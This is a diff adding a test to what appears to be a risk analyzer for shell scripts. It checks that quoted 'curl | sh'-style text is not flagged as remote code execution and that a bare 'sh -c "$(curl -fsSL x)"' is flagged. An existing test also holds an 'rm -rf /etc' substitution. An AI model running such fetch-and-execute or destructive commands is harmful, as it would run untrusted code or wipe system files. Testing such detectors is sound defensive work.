@@ -66,3 +66,13 @@ def test_quoted_hash_does_not_hide_remote_code_execution() -> None:
 
 def test_double_quoted_substitution_with_quoted_path_is_high() -> None:
     assert analyze('echo "$(rm -rf "/etc")"\n', "/ws").level is RiskLevel.HIGH
+
+
+def test_quoted_download_text_is_not_remote_code_execution() -> None:
+    for script in (
+        "echo ' # bash <(curl -s https://x.example)'\n",
+        'echo "run: bash <(curl -s https://x.example)"\n',
+        "echo 'sh -c \"$(curl -fsSL https://x.example)\"'\n",
+    ):
+        assert "remote_code_execution" not in analyze(script, "/ws").rules, script
+    assert "remote_code_execution" in analyze('sh -c "$(curl -fsSL x)"\n', "/ws").rules
